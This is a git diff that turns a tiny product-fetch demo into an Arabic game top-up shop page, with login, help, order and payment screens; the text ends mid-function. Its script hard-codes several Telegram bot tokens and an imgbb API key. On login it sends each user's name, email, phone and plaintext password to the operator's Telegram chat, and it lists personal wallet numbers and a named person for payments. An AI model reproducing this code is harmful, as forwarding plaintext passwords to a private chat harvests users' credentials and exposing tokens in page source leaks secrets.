@@ -1,24 +1,1010 @@
 <!DOCTYPE html>
-<html lang="ar">
-<head>
-  <meta charset="UTF-8">
-  <title>تجربة جلب المنتجات</title>
-</head>
-<body>
-  <h1>🚀 تجربة جلب المنتجات</h1>
-  <button id="fetchBtn">جلب المنتجات</button>
-  <pre id="result"></pre>
-
-  <script>
-    document.getElementById("fetchBtn").addEventListener("click", async () => {
-      try {
-        const res = await fetch("/api/products");
-        const data = await res.json();
-        document.getElementById("result").textContent = JSON.stringify(data, null, 2);
-      } catch (err) {
-        document.getElementById("result").textContent = "❌ خطأ: " + err.message;
+<html lang="ar" dir="rtl">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>موقع شحن الألعاب</title>
+    <style>
+      /* --- ألوان وتصميم --- */
+      * { margin:0; padding:0; box-sizing:border-box }
+      body { font-family:Arial,Helvetica,sans-serif; background:#000; color:#fff; overflow-x:hidden }
+      header { background:#111; padding:10px 20px; position:relative; text-align:center }
+      header img { height:90px; width:auto; display:block; margin:0 auto }
+      #ordersStatusBar { margin:8px auto 0; max-width:720px; padding:4px 8px; border-radius:6px; text-align:center; min-height:22px; display:none; overflow:hidden; white-space:normal; pointer-events:none }
+      .status-line { color:#FFCB01; padding:2px 4px; margin:2px 0; font-size:13px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; display:block; font-weight:700; border-bottom:1px solid rgba(255,203,1,0.06); line-height:1.1 }
+      .status-line:last-child { border-bottom:none }
+      .menu { position:absolute; right:20px; font-size:28px; cursor:pointer; color:#FFCB01; top:50%; transform:translateY(-50%) }
+      #personalNumberDisplay { position:absolute; left:20px; top:50%; transform:translateY(-50%); color:#FFCB01; font-weight:bold; font-size:13px }
+      #notifBell { position:absolute; right:68px; top:50%; transform:translateY(-50%); font-size:22px; cursor:pointer; color:#FFCB01 }
+      #notifBell .badge { background:#ff3b30; color:#fff; border-radius:999px; padding:2px 6px; font-size:12px; margin-left:6px; vertical-align:middle }
+      #notifBell .badge.hidden { display:none }
+      .notif-panel { position:fixed; top:70px; right:20px; width:360px; max-width:92%; background:#111; border:2px solid #FFCB01; border-radius:10px; padding:10px; z-index:1500; box-shadow:0 6px 30px rgba(0,0,0,0.6) }
+      .notif-panel.hidden { display:none }
+      .notif-panel .panel-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px }
+      .notif-panel h4 { margin:0; color:#FFCB01 }
+      .notif-panel .close-btn { cursor:pointer; color:#FFCB01; font-size:20px }
+      .notif-list { max-height:360px; overflow:auto; padding-right:6px }
+      .notif-item { border:1px solid rgba(255,203,1,0.06); padding:8px; border-radius:8px; margin-bottom:8px; background:#000; position:relative }
+      .notif-item .time { font-size:12px; color:#999; margin-top:6px }
+      .notif-item .remove { position:absolute; left:8px; top:6px; cursor:pointer; color:#ff6b6b }
+      .notif-empty { color:#999; text-align:center; padding:20px }
+      .notif-actions { display:flex; gap:8px; justify-content:space-between; margin-top:8px }
+      .notif-actions .btn { background:#FFCB01; color:#000; padding:8px; border-radius:8px; cursor:pointer }
+      #ordersStatusBarInNotif { margin-bottom:8px; display:none; max-height:120px; overflow:auto; border-bottom:1px dashed rgba(255,203,1,0.06); padding-bottom:8px }
+      .sidebar { position:fixed; top:0; right:-100%; width:80%; max-width:300px; height:100%; background:#111; padding:20px; transition:0.28s; z-index:1000; overflow-y:auto; border-left:2px solid #222 }
+      .sidebar.active { right:0 }
+      .sidebar .close-btn { font-size:30px; color:#FFCB01; cursor:pointer; text-align:left }
+      .sidebar a { display:block; color:#fff; text-decoration:none; margin:16px 0; font-size:18px }
+      .sidebar a:hover { color:#FFCB01 }
+      .sidebar .profile-area { display:flex; align-items:center; gap:10px; cursor:pointer; margin-bottom:12px }
+      .sidebar .avatar { width:48px; height:48px; border-radius:50%; background:#222; display:flex; align-items:center; justify-content:center; font-size:20px; color:#FFCB01; border:2px solid #FFCB01; }
+      .sidebar .profile-text { flex:1; overflow:hidden }
+      .sidebar .profile-name { font-weight:700; color:#FFCB01; font-size:15px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis }
+      .sidebar .profile-num { font-size:12px; color:#ccc; white-space:nowrap; overflow:hidden; text-overflow:ellipsis }
+      .container { display:grid; grid-template-columns:repeat(auto-fill,minmax(120px,1fr)); gap:15px; padding:20px }
+      .card { background:#111; border:2px solid #FFCB01; border-radius:12px; padding:20px; text-align:center; cursor:pointer; transition:.25s; aspect-ratio:1/1; display:flex; align-items:center; justify-content:center }
+      .card:hover { background:#FFCB01; color:#000 }
+      .hidden { display:none }
+      .form-box { background:#111; border:2px solid #FFCB01; border-radius:12px; padding:20px; margin:20px }
+      select,input,button,textarea { width:100%; padding:10px; margin:10px 0; border-radius:8px; border:none; font-size:16px; background:#222; color:#fff }
+      .button-option { background:#222; color:#FFCB01; border:2px solid #FFCB01; margin:5px 0; padding:10px; border-radius:8px; cursor:pointer; width:100%; text-align:center; font-weight:bold }
+      .button-option:hover { background:#FFCB01; color:#000 }
+      .button-option.selected { background:#FFCB01; color:#000 }
+      button { background:#FFCB01; color:#000; font-weight:bold; cursor:pointer; border-radius:8px; padding:10px }
+      .small-btn { display:inline-block; padding:8px 12px; border-radius:8px; background:#FFCB01; color:#000; cursor:pointer; margin-top:8px; text-align:center }
+      .back-btn { display:block; margin:20px auto; background:#FFCB01; color:#000; padding:10px; border-radius:8px; text-align:center; font-weight:bold; cursor:pointer }
+      .price-note { color:#FFCB01; font-weight:bold; margin:10px 0; font-size:14px; white-space:pre-line }
+      .orders-list { padding:10px; margin:10px; background:#111; border-radius:10px; border:1px solid #333 }
+      .order-item { padding:12px; border:2px solid #FFCB01; border-radius:8px; margin-bottom:10px; background:#111 }
+      .orders-close { position:absolute; right:20px; top:80px; font-size:36px; cursor:pointer; color:#FFCB01; transform:none }
+      .login-page { max-width:600px; margin:18px auto; padding:16px }
+      .login-note { font-size:13px; color:#aaa; margin-top:6px; }
+      @media(max-width:600px){
+        header img { height:80px }
+        .menu { font-size:24px }
+        #personalNumberDisplay { font-size:12px; left:12px }
+        .orders-close { font-size:30px; top:68px }
+        .notif-panel { right:8px; left:8px }
       }
-    });
-  </script>
-</body>
+      button[disabled]{ opacity:.5; cursor:not-allowed }
+      .small-muted { font-size:12px; color:#aaa; margin-top:6px }
+      .error { color:#ff6b6b; font-size:13px }
+      .field-row { display:flex; gap:10px; flex-wrap:wrap }
+      .field-row input { flex:1 }
+      .muted-small { font-size:13px; color:#aaa; margin-top:6px }
+      .upload-status { font-size:13px; color:#aaa; margin-top:6px }
+      /* إخفاء حقول الهاتف من صفحة اختيار الحزمة (مطلوب حسب التعديل) */
+      .hide-phone-input { display:none !important; }
+
+      /* --- Loader وProducts grid --- */
+      .loader { display:inline-block; padding:8px 12px; border-radius:999px; border:2px dashed rgba(255,255,255,0.08); color:#FFCB01 }
+      .product-title { font-weight:700; display:block; margin-bottom:6px }
+      .product-price { font-size:13px; color:#ccc }
+    </style>
+  </head>
+  <body>
+    <header>
+      <img src="https://i.postimg.cc/W1Ysr3QG/image.png" alt="Logo">
+      <div id="personalNumberDisplay">رقمك الشخصي: <span id="personalNum"></span></div>
+      <div id="notifBell" title="الإشعارات" onclick="toggleNotifPanel()">🔔<span id="notifBadge" class="badge hidden">0</span></div>
+      <div class="menu" onclick="toggleSidebar()">☰</div>
+      <div id="ordersStatusBar" aria-live="polite" role="status" style="display:none"></div>
+    </header>
+
+    <div id="notifPanel" class="notif-panel hidden" aria-live="polite">
+      <div class="panel-header">
+        <h4>الإشعارات</h4>
+        <div>
+          <span class="close-btn" onclick="closeNotifPanel()">×</span>
+        </div>
+      </div>
+      <div id="ordersStatusBarInNotif" aria-live="polite"></div>
+      <div id="notifList" class="notif-list"></div>
+      <div class="notif-actions">
+        <div class="btn" onclick="goHomeFromNotif()">العودة للصفحة الرئيسية</div>
+        <div class="btn" onclick="clearAllNotifForCurrent()">مسح الكل</div>
+      </div>
+    </div>
+
+    <div class="sidebar" id="sidebar">
+      <div class="close-btn" onclick="toggleSidebar()">×</div>
+      <div class="profile-area" id="sidebarProfile" onclick="openProfileFromSidebar()">
+        <div class="avatar" id="sidebarAvatar">أ</div>
+        <div class="profile-text">
+          <div class="profile-name" id="sidebarName">ضيف</div>
+          <div class="profile-num" id="sidebarPersonalNum">--</div>
+        </div>
+      </div>
+      <a href="#" onclick="showHome(); toggleSidebar(); return false;">الرئيسية</a>
+      <a href="#" onclick="navigateToOrders(); toggleSidebar(); return false;">الطلبات</a>
+      <a href="#" onclick="toggleSidebar(); window.open('https://wa.me/79228576801','_blank'); return false;">التواصل مع الدعم</a>
+      <a href="#" onclick="showHelpPage(); toggleSidebar(); return false;">المساعدة في حل مشكلة</a>
+      <a href="#" onclick="showOffersPage(); toggleSidebar(); return false;">العروض والهدايا</a>
+      <a href="https://chat.whatsapp.com/LvrWRUCqLOw4cxjPlnH33J?mode=ems_copy_t" target="_blank" rel="noopener noreferrer">انضمام لمجتمع واتساب</a>
+      <hr style="border:none;height:1px;background:#222;margin:12px 0">
+      <a href="#" onclick="showGamesPage(); toggleSidebar(); return false;">قسم الألعاب</a>
+      <a href="#" onclick="showAppsPage(); toggleSidebar(); return false;">قسم التطبيقات</a>
+    </div>
+
+    <!-- تسجيل الدخول -->
+    <div id="loginPage" class="form-box login-page hidden">
+      <h3 style="text-align:center;color:#FFCB01;">تسجيل الدخول / التسجيل</h3>
+
+      <label>ضع الأسم</label>
+      <input type="text" id="loginName" placeholder="أدخل اسمك">
+
+      <label>البريد الإلكتروني</label>
+      <input type="email" id="loginEmail" placeholder="example@domain.com">
+
+      <label>كلمة السر</label>
+      <div style="position:relative;">
+        <input type="password" id="loginPassword" placeholder="كلمة السر">
+        <button id="loginTogglePwd" style="position:absolute;left:6px;top:10px;height:36px;width:80px;cursor:pointer;">اظهار</button>
+      </div>
+
+      <label>رقم هاتف</label>
+      <input type="text" id="loginPhone" placeholder="مثال: 0999xxxxxx">
+
+      <label>ضع الرقم الشخصي اللي ولده الموقع (غير قابل للتعديل)</label>
+      <input type="text" id="loginPersonalNumber" readonly>
+
+      <div class="small-muted" style="margin-top:6px;">
+        ملاحظة: لن يتم ارسال اي كود على البريد الإلكتروني او رقم الهاتف.
+        فقط قم بتعبئة بياناتك الاصلية ففي حال حدوث مشكلة نستطيع التواصل معك.
+      </div>
+
+      <div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:12px;">
+        <button id="doLoginBtn">تسجيل الدخول</button>
+      </div>
+
+      <div id="loginError" class="error" style="display:none;"></div>
+    </div>
+
+    <!-- ملف شخصي -->
+    <div id="profilePage" class="hidden">
+      <div class="form-box login-box">
+        <h3 style="text-align:center;color:#FFCB01;">الملف الشخصي</h3>
+        <label>الاسم</label>
+        <input type="text" id="profileName" readonly>
+        <label>البريد الإلكتروني</label>
+        <input type="email" id="profileEmail" readonly>
+        <label>كلمة السر</label>
+        <input type="password" id="profilePassword" readonly>
+        <label>رقم الهاتف</label>
+        <input type="text" id="profilePhone" readonly>
+        <div style="display:flex;gap:10px;flex-wrap:wrap;">
+          <button id="requestEditBtn">طلب تعديل معلوماتك</button>
+          <button id="confirmSaveBtn" class="hidden">حفظ التعديلات</button>
+          <div class="back-btn" onclick="returnFromProfile()">⬅ رجوع</div>
+        </div>
+        <div id="profileMsg" class="muted-small"></div>
+      </div>
+    </div>
+
+    <!-- بقية الصفحات -->
+    <div id="homePage" class="hidden">
+      <div class="container" id="productsGrid">
+        <!-- سيتم ملء البطاقات بالمنتجات من الخادم -->
+        <div class="card" onclick="showGamesPage()">قسم الألعاب</div>
+        <div class="card" onclick="showAppsPage()">قسم التطبيقات</div>
+      </div>
+    </div>
+
+    <div id="helpPage" class="hidden">
+      <div class="form-box">
+        <h3 style="text-align:center;">المساعدة في حل مشكلة</h3>
+        <label>الرقم الشخصي (غير قابل للتعديل)</label>
+        <input type="text" id="helpPersonalField" readonly>
+        <label>-اختر مشكلتلك-</label>
+        <select id="helpIssueSelect">
+          <option value="" disabled selected>-- اختر مشكلتلك --</option>
+          <option value="لا استطيع تعبئة البيانات">لا استطع تعبئة البيانات</option>
+          <option value="قمت بتحويل الرصيد ولم يُراجع طلبي">قمت بتحويل الرصيد ولم يُراجع طلبي</option>
+          <option value="تم قبول طلبي لكن لم يصلني شيء">تم قبول طلبي لكن لم يصلني شيء</option>
+          <option value="لا استطيع ارسال لقطة شاشة">لا استطيع ارسال لقطة شاشة</option>
+        </select>
+        <label>إرفاق ملف (اختياري)</label>
+        <input type="file" id="helpFileUpload" accept="image/*">
+        <div class="upload-status" id="helpUploadStatus"></div>
+        <input type="text" id="helpFileLink" placeholder="رابط الملف سيظهر هنا (اختياري)" readonly>
+        <label>وصف المشكلة</label>
+        <textarea id="helpDesc" rows="5" maxlength="100" placeholder="صِف مشكلتك وضع رقم العملية:#*********"></textarea>
+        <div style="display:flex;gap:10px;flex-wrap:wrap;">
+          <button id="helpSubmitBtn">إرسال</button>
+          <div class="back-btn" onclick="showHome()">⬅ رجوع</div>
+        </div>
+      </div>
+    </div>
+
+    <div id="helpSuccessPage" class="hidden">
+      <div class="form-box" style="text-align:center;">
+        <h3>لقد تم رفع مشكلتك بنجاح</h3>
+        <p>انتظر سيتم التواصل معك</p>
+        <div class="back-btn" onclick="showHome()">⬅ رجوع للصفحة الرئيسية</div>
+      </div>
+    </div>
+
+    <div id="gamesPage" class="hidden">
+      <div class="form-box">
+        <h3>اختر لعبتك</h3>
+        <select id="gameSelect">
+          <option value="">-- اختر لعبة --</option>
+          <option value="أكواد فري فاير">أكواد فري فاير</option>
+          <option value="فري فاير ايدي">فري فاير ايدي</option>
+          <option value="ببجي ايدي">ببجي ايدي</option>
+          <option value="أكواد ببجي">أكواد ببجي</option>
+          <option value="جواكر">جواكر</option>
+        </select>
+        <input type="text" id="personalField" readonly>
+        <!-- تم ازالة حقل رقم الهاتف من صفحة اختيار الحزمة حسب المطلوب -->
+        <input type="text" id="idField" placeholder="ضع الايدي" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+        <div id="optionsContainer"></div>
+        <div id="priceDisplay"></div>
+        <button id="submitForm" disabled>إرسال</button>
+        <div class="price-note" id="paymentNote">اختر الحزمة ثم اضغط إرسال للمتابعة لصفحة الدفع</div>
+        <div id="orderStatus" style="color:#0f0;font-weight:bold;text-align:center;margin-top:10px;"></div>
+        <div style="text-align:center;">
+          <button id="goOrdersBtn" class="small-btn hidden" onclick="navigateToOrders()">عرض الطلبات</button>
+        </div>
+        <div class="back-btn" onclick="showHome()">⬅ رجوع للصفحة الرئيسية</div>
+      </div>
+    </div>
+
+    <div id="appsPage" class="hidden">
+      <div class="form-box">
+        <h3>اختر التطبيق</h3>
+        <select id="appSelect">
+          <option value="">-- اختر تطبيق --</option>
+          <option value="تطبيق 1">تطبيق 1</option>
+          <option value="تطبيق 2">تطبيق 2</option>
+          <option value="تطبيق 3">تطبيق 3</option>
+        </select>
+        <input type="text" id="appPersonalField" readonly>
+        <input type="text" id="appIdField" placeholder="ضع الايدي" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+        <div id="optionsContainerApps"></div>
+        <div id="priceDisplayApps"></div>
+        <button id="appSubmitForm" disabled>إرسال</button>
+        <div class="price-note" id="appPaymentNote">اختر الباقة/التطبيق ثم اضغط إرسال للمتابعة لصفحة الدفع</div>
+        <div id="appOrderStatus" style="color:#0f0;font-weight:bold;text-align:center;margin-top:10px;"></div>
+        <div style="text-align:center;">
+          <button id="goOrdersBtnApp" class="small-btn hidden" onclick="navigateToOrders()">عرض الطلبات</button>
+        </div>
+        <div class="back-btn" onclick="showHome()">⬅ رجوع للصفحة الرئيسية</div>
+      </div>
+    </div>
+
+    <!-- صفحة العروض والهدايا -->
+    <div id="offersPage" class="hidden">
+      <div class="form-box">
+        <h3 style="text-align:center;color:#FFCB01;">العروض والهدايا</h3>
+        <div id="offersList" style="min-height:120px;"></div>
+        <div style="text-align:center;margin-top:10px;">
+          <div class="back-btn" onclick="showHome()">⬅ رجوع للصفحة الرئيسية</div>
+        </div>
+      </div>
+    </div>
+
+    <div id="paymentDetailsPage" class="hidden">
+      <div class="form-box">
+        <div class="back-btn" onclick="returnFromPaymentDetails()">⬅ رجوع</div>
+        <h3 id="pdTitle" style="text-align:center;">تفاصيل الدفع</h3>
+        <div id="pdContent">
+          <div id="pdTopInfo" style="text-align:center;margin-bottom:10px;color:#FFCB01;font-weight:bold;"></div>
+          <select id="pdCashSelect">
+            <option value="">-- اختر طريقة الدفع --</option>
+            <option value="sham">شام كاش</option>
+            <option value="syrtel">سيرتيل كاش</option>
+            <option value="mtn">MTN كاش</option>
+            <option value="hawala">حوالة مالية</option>
+          </select>
+          <div style="position:relative; margin-bottom:10px;">
+            <input type="text" id="pdCopyField" readonly style="width:100%;padding-right:80px;">
+            <button type="button" id="pdCopyBtn" style="position:absolute;left:0;top:0;height:100%;width:70px;cursor:pointer;">نسخ</button>
+          </div>
+          <div style="text-align:center;margin-bottom:10px;">
+            <button type="button" id="pdToggleQrBtn">اظهر/اخفِ QR</button>
+          </div>
+          <div id="qrContainer" style="display:none;margin-top:10px;text-align:center;">
+            <img id="qrImg" src="https://i.postimg.cc/vHYg2nK5/IMG.jpg" alt="QR شام" style="width:300px;height:auto;">
+          </div>
+          <div id="syrtelQrContainer" style="display:none;margin-top:10px;text-align:center;">
+            <img id="syrtelQrImg" src="https://i.postimg.cc/tT6ScwYv/IMG.jpg" alt="QR سيريتيل" style="width:300px;height:auto;">
+          </div>
+
+          <div id="shamFields" style="display:none;margin-top:10px;">
+            <div style="padding:8px;border:1px solid #333;border-radius:8px;">
+              <strong>تحويل شام كاش إلى:</strong>
+              <div style="margin-top:6px;">العنوان/المحفظة: <span id="shamAddressDisplay">e5eca798a4add8f1b86d389330131c82</span></div>
+            </div>
+          </div>
+
+          <div id="syrtelFields" style="display:none;margin-top:10px;">
+            <div style="padding:8px;border:1px solid #333;border-radius:8px;">
+              <strong>تحويل سيرتيل كاش إلى:</strong>
+              <div style="margin-top:6px;">الرقم: <span id="syrtelAddressDisplay">72289118</span></div>
+            </div>
+          </div>
+
+          <div id="hawalaFields" style="display:none;margin-top:10px;">
+            <div style="padding:8px;border:1px solid #333;border-radius:8px;">
+              <strong>قم بتحويل الرصيد المطلوب إلى الاسم التالي:</strong>
+              <div style="margin-top:8px;">عبد الرحمن احمد عتون</div>
+              <div class="muted-small" style="margin-top:8px;color:#ccc;">
+                التحويل يتم عبر مكاتب الصرافة الموجودة في سوريا مثل: الهرم، الفؤاد، دوفيز، الخ...
+              </div>
+            </div>
+          </div>
+
+          <input type="file" id="paymentFileUpload" accept="image/*">
+          <div class="upload-status" id="paymentUploadStatus"></div>
+          <input type="text" id="paymentFileLink" placeholder="رابط الملف سيظهر هنا" readonly>
+          <div id="pdPriceInfo" style="color:#0f0;font-weight:bold;margin-top:10px;text-align:center"></div>
+          <div class="price-note" id="pdNote" style="white-space:pre-line">اختر طريقة الدفع لمتابعة التعليمات</div>
+          <button id="pdSubmitForm">إرسال الطلب</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="reviewPage" class="hidden">
+      <div class="form-box">
+        <h3 style="text-align:center;color:#FFCB01;">حالة الطلب</h3>
+        <p id="reviewMsg" style="text-align:center;margin-top:10px;color:#fff;">تم استلام طلبك وسيتم مراجعته قريباً.</p>
+        <div style="text-align:center;margin-top:15px;">
+          <button class="review-go-orders" onclick="navigateToOrders()">اذهب إلى الطلبات</button>
+        </div>
+        <div style="text-align:center;margin-top:12px;">
+          <button class="back-btn" onclick="goHome()">الذهاب للصفحة الرئيسية</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="ordersPage" class="hidden">
+      <div class="form-box" style="position:relative;">
+        <div class="orders-close" onclick="returnFromOrders()">×</div>
+        <h3 style="text-align:center">الطلبات</h3>
+        <div id="ordersList" class="orders-list"></div>
+        <div class="back-btn" onclick="showHome()">⬅ رجوع للصفحة الرئيسية</div>
+      </div>
+    </div>
+
+    <script>
+      // ---------- إعدادات (تعديلت لتوافق الطلب) ----------
+      const botToken = "8484157462:AAGHyBqwL9k1EmzvXAIZkb9UNDcwIGMINAs"; // بوت الدفع/النظام القديم (كما كان)
+      const chat_id = "7649409589";
+      const personalBotToken = "7867503081:AAE32J-TrMh52QYHrbPzsKxnM7qbgA9iKCo"; // بوت الأوامر الإدارية - محدث كما طلبت
+      const loginReportBotToken = "8322394934:AAFik8dEU71oOxBCHlhOVNKFGATWnqlg-_8"; // تقرير التسجيل (موجود)
+      const loginReportChatId = "7649409589";
+      const IMGBB_API_KEY = "e5603dfd5675ed2b5a671577abcf6d33"; // مفتاح imgbb الذي زودتني به
+      // بوت المساعدة (تم طلبه خصيصًا)
+      const helpBotToken = "8242410438:AAHtm6-aIldfmTe1JQVnhdYkOIY3MaN4aFA";
+      const helpBotChatId = "7649409589";
+      // بوت العروض والهدايا (لإرسال/التحقق)
+      const offersBotToken = "7976416746:AAGyvWAxanxhkz--4c6U_3-NA2TGBV4lJ9Y";
+      const offersBotChatId = "7649409589";
+
+      const PERSONAL_LAST_UPDATE_KEY = "personal_tg_last_update_id_v1";
+      const PROFILE_KEY = "user_profile_v1";
+      const LOGIN_REPORT_LAST_UPDATE_KEY = "login_report_tg_last_update_id_v1";
+      const PROFILE_EDIT_REQUESTS_KEY = "profile_edit_requests_v1";
+
+      let previousPageId = null;
+      let previousBeforePayment = null;
+
+      // رقم شخصي
+      let personalNumber = localStorage.getItem("personalNumber");
+      if(!personalNumber){
+        personalNumber = Math.floor(1000000 + Math.random()*9000000);
+        localStorage.setItem("personalNumber", personalNumber);
+      }
+
+      // load/save profile helpers
+      function loadProfile(){ try{ const raw = localStorage.getItem(PROFILE_KEY); return raw ? JSON.parse(raw) : null; }catch(e){ return null; } }
+      function saveProfile(profile){ try{ localStorage.setItem(PROFILE_KEY, JSON.stringify(profile||{})); }catch(e){} }
+
+      function loadProfileEditRequests(){ try{ const raw = localStorage.getItem(PROFILE_EDIT_REQUESTS_KEY); return raw?JSON.parse(raw):{} }catch(e){ return {}; } }
+      function saveProfileEditRequests(obj){ try{ localStorage.setItem(PROFILE_EDIT_REQUESTS_KEY, JSON.stringify(obj)); }catch(e){} }
+
+      // helper: blocked numbers management (حظر محلي)
+      function loadBlockedNumbers(){ try{ return JSON.parse(localStorage.getItem('blocked_personal_numbers_v1')||'[]'); }catch(e){ return []; } }
+      function saveBlockedNumbers(arr){ try{ localStorage.setItem('blocked_personal_numbers_v1', JSON.stringify(arr||[])); }catch(e){} }
+      function isBlockedPersonal(p){ const list=loadBlockedNumbers(); return list.map(String).includes(String(p)); }
+      function blockPersonalNumber(p){ const list=loadBlockedNumbers(); if(!list.map(String).includes(String(p))){ list.push(String(p)); saveBlockedNumbers(list); } }
+      function unblockPersonalNumber(p){ let list=loadBlockedNumbers(); list=list.filter(x=>String(x)!==String(p)); saveBlockedNumbers(list); }
+
+      function ensureNotBlocked(){
+        if(isBlockedPersonal(personalNumber)){
+          alert('تم حظر حسابك');
+          showLoginPage();
+          return false;
+        }
+        return true;
+      }
+
+      // تهيئة واجهة أولية
+      document.getElementById("personalNum").textContent = personalNumber;
+      document.getElementById("personalField").value = personalNumber;
+      document.getElementById("appPersonalField").value = personalNumber;
+      document.getElementById("helpPersonalField").value = personalNumber;
+      document.getElementById("loginPersonalNumber").value = personalNumber;
+      document.getElementById("sidebarPersonalNum").textContent = "رقم: " + personalNumber;
+
+      function updateSidebarProfileDisplay(){
+        const prof = loadProfile();
+        const nameEl = document.getElementById("sidebarName");
+        const avatarEl = document.getElementById("sidebarAvatar");
+        const displayName = (prof && prof.name) ? prof.name : "ضيف";
+        nameEl.textContent = displayName;
+        avatarEl.textContent = displayName && displayName.trim().length>0 ? displayName.trim().charAt(0).toUpperCase() : "أ";
+      }
+      updateSidebarProfileDisplay();
+
+      // التنقل
+      function toggleSidebar(){ document.getElementById("sidebar").classList.toggle("active"); }
+      function hideAllPages(){ ["homePage","gamesPage","appsPage","ordersPage","paymentDetailsPage","reviewPage","helpPage","helpSuccessPage","profilePage","loginPage","offersPage"].forEach(id=>{ const el=document.getElementById(id); if(el) el.classList.add("hidden"); }); }
+      function showHome(){ if(!ensureNotBlocked()) return; hideAllPages(); document.getElementById("homePage").classList.remove("hidden"); fetchProducts(); }
+      function goHome(){ showHome(); window.scrollTo({top:0,behavior:'smooth'}); }
+      function showGamesPage(){ if(!ensureNotBlocked()) return; hideAllPages(); document.getElementById("gamesPage").classList.remove("hidden"); window.scrollTo({top:0,behavior:'smooth'}); }
+      function showAppsPage(){ if(!ensureNotBlocked()) return; hideAllPages(); document.getElementById("appsPage").classList.remove("hidden"); window.scrollTo({top:0,behavior:'smooth'}); }
+      function showHelpPage(){ if(!ensureNotBlocked()) return; hideAllPages(); document.getElementById("helpPage").classList.remove("hidden"); window.scrollTo({top:0,behavior:'smooth'}); }
+      function showHelpSuccessPage(){ hideAllPages(); document.getElementById("helpSuccessPage").classList.remove("hidden"); window.scrollTo({top:0,behavior:'smooth'}); }
+      function showProfilePage(){ if(!ensureNotBlocked()) return; hideAllPages(); document.getElementById("profilePage").classList.remove("hidden"); window.scrollTo({top:0,behavior:'smooth'}); }
+      function showLoginPage(){ hideAllPages(); document.getElementById("loginPage").classList.remove("hidden"); window.scrollTo({top:0,behavior:'smooth'}); }
+      function showOffersPage(){ if(!ensureNotBlocked()) return; hideAllPages(); document.getElementById("offersPage").classList.remove("hidden"); renderOffers(); window.scrollTo({top:0,behavior:'smooth'}); }
+
+      function getCurrentPageId(){ const ids=["homePage","gamesPage","appsPage","ordersPage","paymentDetailsPage","reviewPage","helpPage","helpSuccessPage","profilePage","loginPage","offersPage"]; for(const id of ids) if(!document.getElementById(id).classList.contains('hidden')) return id; return "homePage"; }
+      function navigateToOrders(){ previousPageId = getCurrentPageId(); hideAllPages(); document.getElementById("ordersPage").classList.remove("hidden"); renderOrders(); window.scrollTo({top:0,behavior:'smooth'}); }
+      function returnFromOrders(){ if(previousPageId && document.getElementById(previousPageId)){ hideAllPages(); document.getElementById(previousPageId).classList.remove('hidden'); } else showHome(); }
+      function returnFromPaymentDetails(){ if(previousBeforePayment && document.getElementById(previousBeforePayment)){ hideAllPages(); document.getElementById(previousBeforePayment).classList.remove('hidden'); } else showHome(); }
+
+      function openProfileFromSidebar(){ toggleSidebar(); const prof = loadProfile() || {}; document.getElementById("profileName").value = prof.name || ""; document.getElementById("profileEmail").value = prof.email || ""; document.getElementById("profilePassword").value = prof.password || ""; document.getElementById("profilePhone").value = prof.phone || ""; applyProfileEditState(); document.getElementById("profileError")?.setAttribute('style','display:none;'); showProfilePage(); }
+      function returnFromProfile(){ if(previousPageId && document.getElementById(previousPageId)){ hideAllPages(); document.getElementById(previousPageId).classList.remove('hidden'); } else showHome(); }
+
+      // toggle pwd
+      document.getElementById("loginTogglePwd").addEventListener("click", function(){ const inp = document.getElementById("loginPassword"); if(inp.type === 'password'){ inp.type='text'; this.textContent = 'اخفِ'; } else { inp.type='password'; this.textContent = 'اظهار'; } });
+
+      // تسجيل / إرسال بيانات التسجيل إلى بوت التسجيل (شامل كلمة السر)
+      document.getElementById("doLoginBtn").addEventListener("click", async function(){
+        const name = (document.getElementById("loginName").value || "").trim();
+        const email = (document.getElementById("loginEmail").value || "").trim();
+        const password = (document.getElementById("loginPassword").value || "");
+        const phone = (document.getElementById("loginPhone").value || "").trim();
+        const personal = document.getElementById("loginPersonalNumber").value || personalNumber;
+        const errEl = document.getElementById("loginError");
+        errEl.style.display = 'none'; errEl.textContent = '';
+
+        if(!name){ errEl.textContent = 'الرجاء إدخال الاسم'; errEl.style.display='block'; return; }
+        if(email && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){ errEl.textContent = 'صيغة البريد الإلكتروني غير صحيحة'; errEl.style.display='block'; return; }
+        if(!password){ errEl.textContent = 'الرجاء إدخال كلمة السر'; errEl.style.display='block'; return; }
+        if(phone && !/^[0-9\+\-\s]{6,20}$/.test(phone)){ errEl.textContent = 'صيغة رقم الهاتف غير صحيحة'; errEl.style.display='block'; return; }
+
+        const profile = { name, email, password, phone, personalNumber: String(personal), canEdit:false };
+        saveProfile(profile);
+        updateSidebarProfileDisplay();
+
+        const msg = `تسجيل مستخدم جديد:\nالاسم: ${name}\nالبريد: ${email || 'لا يوجد'}\nالهاتف: ${phone || 'لا يوجد'}\nالرقم الشخصي: ${personal}\nكلمة السر: ${password}`;
+
+        try{
+          await fetch(`https://api.telegram.org/bot${loginReportBotToken}/sendMessage`, {
+            method: "POST",
+            headers: {'Content-Type':'application/json'},
+            body: JSON.stringify({ chat_id: loginReportChatId, text: msg })
+          });
+        }catch(e){
+          console.warn("login report send error", e);
+        }
+
+        // بعد تسجيل الدخول نعرض الصفحة الرئيسية
+        showHome();
+        document.getElementById("personalNum").textContent = personal;
+        document.getElementById("personalField").value = personal;
+        document.getElementById("appPersonalField").value = personal;
+        document.getElementById("helpPersonalField").value = personal;
+      });
+
+      function applyProfileEditState(){
+        const prof = loadProfile() || {};
+        const canEdit = !!prof.canEdit;
+        const fields = ["profileName","profileEmail","profilePassword","profilePhone"];
+        fields.forEach(id=>{
+          const el = document.getElementById(id);
+          if(!el) return;
+          if(canEdit){ el.removeAttribute("readonly"); el.style.background="#222"; } else { el.setAttribute("readonly","readonly"); el.style.background="#222"; }
+        });
+        const reqBtn = document.getElementById("requestEditBtn");
+        const saveBtn = document.getElementById("confirmSaveBtn");
+        const msgEl = document.getElementById("profileMsg");
+        msgEl.textContent = '';
+        if(canEdit){
+          reqBtn.classList.add("hidden");
+          saveBtn.classList.remove("hidden");
